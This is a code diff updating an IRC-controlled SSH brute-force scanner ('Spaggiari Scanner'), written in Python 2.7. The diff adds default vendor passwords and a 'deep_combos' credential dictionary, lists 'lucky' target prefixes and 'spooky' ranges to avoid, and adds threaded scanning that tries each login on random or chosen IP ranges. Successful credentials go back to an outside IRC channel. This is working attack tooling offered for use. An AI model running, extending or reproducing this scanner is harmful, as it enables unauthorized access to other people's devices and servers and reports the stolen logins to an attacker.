@@ -40,15 +40,15 @@ import time
 import urllib2
 
 # IRC Config
-server   = 'irc.server.com'
+server   = 'irc.supernets.org'
 port     = 6697
 use_ssl  = True
 password = None
-channel  = '#scan'
+channel  = '#dev'
 key      = None
 
 # Other Config
-admin_host   = 'admin.host'
+admin_host   = 'super.nets'
 control_char = '@'
 throttle     = 20
 
@@ -65,7 +65,10 @@ combos = [
     'admin:123456',
     'admin:4321',
     'admin:9999',
+    'admin:abc123',
     'admin:admin',
+    'admin:changeme',
+    'admin:admin123',
     'admin:password',
     'Admin:123456',
     'cisco:cisco',
@@ -73,16 +76,28 @@ combos = [
     'pi:raspberry',
     'admin:aerohive',
     'default:defaultpassword',
-    'root:alpine',
-    'root:openelec',
-    'ubnt:ubnt',
-    'user:acme',
-    'vyos:vyos'
 ]
 
+deep_combos = {
+    'admin'     : ['kn1TG7psLu','TANDBERG'],
+    'alien'     : 'alien',
+    'device'    : 'apc',
+    'dpn'       : 'changeme',
+    'HPSupport' : 'badg3r5',
+    'lp'        : 'lp',
+    'master'    : 'themaster01',
+    'root'      : ['alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','rootme','TANDBERG','trendimsa1.0'],
+    'sysadmin'  : 'PASS',
+    'toor'      : 'logapp',
+    'ubnt'      : 'ubnt',
+    'user'      : 'acme',
+    'vyos'      : 'vyos',
+}
+
 # Important Ranges
-lucky = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','31.176','60.51','84.122','95.169','95.6','95.9']
-scary = ['11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7']
+lucky  = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','31.176','60.51','84.122','95.169','95.6','95.9']
+spooky = ['11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7']
+dns    = ['10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255']
 
 # Formatting Control Characters
 bold        = '\x02'
@@ -180,25 +195,30 @@ def get_username() : return getpass.getuser()
 def check_port(ip, port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        code = sock.connect_ex((ip, port))
-        if code == 0 : return True
+        sock.settimeout(1)
+        code = sock.connect((ip, port))
+        if not code  : return True
         else         : return False
     except socket.error:
         return False
     finally:
         sock.close()
 
-def check_spooky(targets):
+def check_range(targets):
     breaker = False
     found   = False
     for ip in targets:
-        if breaker:
-            found = True
-            break
+        if breaker : break
         for spooky_range in spooky:
-            if ip.split('.')[0] == spooky_range:
+            if ip.startswith(spooky_range + '.'):
                 breaker = True
+                found   = True
+                break
+        if breaker : break
+        for dns_range in dns:
+            if ip.startswith(dns_range + '.'):
+                breaker = True
+                found   = True
                 break
     return found
 
@@ -219,9 +239,12 @@ def ip_range(start_ip, end_ip):
               temp[i] = 0
               temp[i-1] += 1
         ip_range.append('.'.join(map(str, temp)))
+    random.shuffle(ip_range)
     return ip_range
 
-def random_str(size) : return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))
+def random_ip()          : return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))
+def random_int(min, max) : return random.randint(min, max)
+def random_str(size)     : return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))
 
 class ssh_bruteforce(threading.Thread):
     def __init__(self, host):
@@ -232,55 +255,70 @@ class ssh_bruteforce(threading.Thread):
             alert('%s has port 22 open.' % self.host)
             SpaggiariBot.sendmsg(channel, '[%s] - %s has port 22 open.' % (color('+', green), self.host))
             for item in combos:
-                user   = item.split(':')[0]
-                passwd = item.split(':')[1]
-                try:
-                    ssh.connect(hostname=self.host, port=22, username=user, password=passwd, timeout=10.0, allow_agent=False, look_for_keys=False, banner_timeout=10.0)
-                    SpaggiariBot.sendmsg(channel, '[%s] - %s using %s:%s' % (color('+', green), self.host, user, passwd))
+                if SpaggiariBot.stop_scan:
                     break
-                except paramiko.ssh_exception.AuthenticationException:
-                    error('Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, passwd))
-                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, passwd))
-                except paramiko.ssh_exception.BadHostKeyException:
-                    error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, passwd))
-                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, passwd))
-                except paramiko.ssh_exception.SSHException:
-                    error('Failed to connect to %s using %s:%s (SSH Exception)' % (self.host, user, passwd))
-                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (SSH Exception)' % (self.host, user, passwd))
-                except socket.error as ex:
-                    error('Failed to connect to %s using %s:%s (%s)' % (self.host, user, passwd, str(ex)))
-                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (%s)' % (self.host, user, passwd, str(ex)))
-                except Exception as ex:
-                    error('Failed to connect to %s using %s:%s (%s)' % (self.host, user, passwd, str(ex)))
-                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (!!!%s)' % (self.host, user, passwd, str(ex)))
-                finally:
-                    ssh.close()
-                time.sleep(throttle)
+                else:
+                    user   = item.split(':')[0]
+                    passwd = item.split(':')[1]
+                    try:
+                        ssh.connect(hostname=self.host, port=22, username=user, password=passwd, timeout=10.0, allow_agent=False, look_for_keys=False, banner_timeout=10.0)
+                        alert('Successful connection to %s using %s' % (self.host, item))
+                        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s' % (color('+', green), self.host, item))
+                        break
+                    except paramiko.ssh_exception.AuthenticationException:
+                        error('Failed to connect to %s using %s (Authentication Error)' % (self.host, item))
+                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s' % (self.host, item), 'Authentication Error')
+                    except paramiko.ssh_exception.BadHostKeyException:
+                        error('Failed to connect to %s using %s (Bad Host Key Exception)' % (self.host, item))
+                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s' % (self.host, item), 'Bad Host Key Exception')
+                    except paramiko.ssh_exception.SSHException:
+                        error('Failed to connect to %s using %s (SSH Exception)' % (self.host, item))
+                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s' % (self.host, item), 'SSH Exception')
+                    except socket.error as ex:
+                        error('Failed to connect to %s using %s (%s)' % (self.host, item, ex))
+                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s' % (self.host, item), ex)
+                    except Exception as ex:
+                        error('Failed to connect to %s using %s (%s)' % (self.host, user, passwd, ex))
+                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s' % (self.host, item), ex)
+                    finally:
+                        ssh.close()
+                        time.sleep(throttle)
         else:
             error('%s does not have port 22 open.' % self.host)
+            SpaggiariBot.error(channel, '%s does not have port 22 open.' % self.host)
 
-def scan(ip_range):
-    for ip in ip_range:
-        ssh_bruteforce(ip).start()
-        time.sleep(0.5)
-        while threading.activeCount() >= 100:
-            time.sleep(10)
+class scan(threading.Thread):
+    def __init__(self, ip_range):
+        self.ip_range = ip_range
+        threading.Thread.__init__(self)
+    def run(self):
+        for ip in self.ip_range:
+            if SpaggiariBot.stop_scan:
+                break
+            else:
+                ssh_bruteforce(ip).start()
+                while threading.activeCount() >= 100:
+                    time.sleep(1)
+        while threading.activeCount() >= 3:
+            time.sleep(1)
+        SpaggiariBot.scanning = False
 
 # IRC Bot Object
 class IRC(object):
     def __init__(self, server, port, use_ssl, password, channel, key, nick, username, realname):
-        self.server   = server
-        self.port     = port
-        self.use_ssl  = use_ssl
-        self.password = password
-        self.channel  = channel
-        self.key      = key
-        self.nickname = nickname
-        self.username = username
-        self.realname = realname
-        self.id       = nick[-5:]
-        self.sock     = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.scanning = False
+        self.server    = server
+        self.port      = port
+        self.use_ssl   = use_ssl
+        self.password  = password
+        self.channel   = channel
+        self.key       = key
+        self.nickname  = nickname
+        self.username  = username
+        self.realname  = realname
+        self.id        = nick[-5:]
+        self.sock      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.scanning  = False
+        self.stop_scan = False
 
     def action(self, chan, msg):
         self.sendmsg(chan, '\x01ACTION %s\x01' % msg)
@@ -304,6 +342,12 @@ class IRC(object):
             except : pass
             self.sock.close()
             self.sock = None
+
+    def error(self, chan, msg, reason=None):
+        if reason:
+            self.sendmsg(chan, '[%s] - %s %s' % (color('-', red), msg, color('(' + reason + ')', grey)))
+        else:
+            self.sendmsg(chan, '[%s] - %s %s' % (color('-', red), msg))
 
     def event_connect(self):
         self.mode(self.nickname, '+B')
@@ -335,12 +379,17 @@ class IRC(object):
                     if cmd == 'info':
                         self.sendmsg(chan, '%s@%s (%s) | %s %s | %s' % (get_username(), get_hostname(), get_ip(), get_dist(), get_arch(), get_kernel()))
                     elif cmd == 'kill':
+                        self.stop_scan = True
+                        self.scanning = False
                         self.quit('KILLED')
                         sys.exit()
                     elif cmd == 'stop':
                         if self.scanning:
-                            self.scanning = False
+                            self.stop_scan = True
+                            while threading.activeCount() >= 3:
+                                time.sleep(1)
                             self.action(chan, 'Stopped all running scans.')
+                            self.scanning = False
                     elif cmd == 'version':
                         self.sendmsg(chan, bold + 'Spaggiari Scanner - Version 1.0b - Developed by acidvegas in Python 2.7 - https://github.com/acidvegas/spaggiari/')    
             elif len(args) >= 3:
@@ -367,16 +416,17 @@ class IRC(object):
                             end   = args[3]
                         if check_ip(start) and check_ip(end):
                             targets = ip_range(start, end)
-                            if not check_spooky(targets):
+                            if not check_range(targets):
                                 self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
+                                self.scanning = True
                                 scan(targets)
                                 self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
                             else:
-                                self.sendmsg(chan, '[%s] - Spooky IP address range.' % color('ERROR', red))
+                                self.error(chan, 'Spooky IP address range.')
                         else:
-                            self.sendmsg(chan, '[%s] - Invalid IP address range.' % color('ERROR', red))
+                            self.error(chan, 'Invalid IP address range.')
                     else:
-                        self.sendmsg(chan, '[%s] - A scan is already running.' % color('ERROR', red))
+                        self.error(chan, 'A scan is already running.')
 
     def handle_events(self, data):
         args = data.split()
